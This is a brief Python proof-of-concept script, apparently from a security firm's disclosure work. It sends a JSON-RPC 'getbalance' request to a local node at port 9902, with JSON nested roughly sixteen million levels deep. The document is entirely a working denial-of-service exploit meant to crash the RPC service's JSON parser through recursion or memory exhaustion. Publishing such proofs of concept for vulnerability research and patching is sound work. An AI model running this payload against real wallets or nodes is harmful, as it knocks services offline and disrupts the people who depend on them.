#!/usr/bin/python3  
# coding = utf-8 
# by SlowMist
import requests
import json
headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
           'Accept-Charset': 'GB2312,utf-8;q=0.7,*;q=0.7',
           'Accept-Language': 'zh-cn,zh;q=0.5',
           'Cache-Control': 'max-age=0',
           'User-Agent': 'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.10 (maverick) Firefox/3.6.14',
           'Content-Type':'application/json'}


url = 'http://127.0.0.1:9902/'
data = '{"id":20,"method":"getbalance","jsonrpc":"2.0","params":{"a":"b","c":{"c":{"c":{"c":{'+ '"c":{'*0xffffff + '}'*0xffffff + '}}}}}}}'
# print(data)
try:
    resp = requests.post(url=url, headers=headers, data=data) 
    print(resp.content)
except requests.exceptions.ConnectionError as e:
    print(e)


